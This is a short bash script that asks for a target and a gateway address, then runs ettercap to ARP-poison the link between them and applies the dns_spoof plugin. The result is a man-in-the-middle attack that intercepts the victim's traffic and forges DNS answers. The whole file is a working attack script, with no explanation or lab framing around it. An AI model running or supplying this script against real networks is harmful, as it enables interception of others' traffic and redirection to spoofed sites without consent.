#!/usr/bin/bash
echo "Target..."
read target
echo "Gateway..."
read gateway
ettercap -T -M arp /$target/ /$gateway/ -p dns_spoof

